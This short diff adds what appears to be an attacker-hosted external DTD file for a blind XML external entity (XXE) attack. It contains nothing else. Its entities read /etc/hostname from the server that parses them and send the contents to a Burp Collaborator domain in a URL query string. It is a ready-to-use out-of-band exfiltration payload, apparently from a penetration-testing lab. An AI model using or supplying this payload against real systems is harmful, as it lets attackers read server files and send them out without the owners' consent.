@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "/etc/hostname">
+<!ENTITY % evaluate "<!ENTITY &#x25; exfiltrate SYSTEM 'http://le3nu8m0arhvzfu2iq1utyno6fc60v.burpcollaborator.net?data=%file;'>">
+%evaluate;
+%exfiltrate;
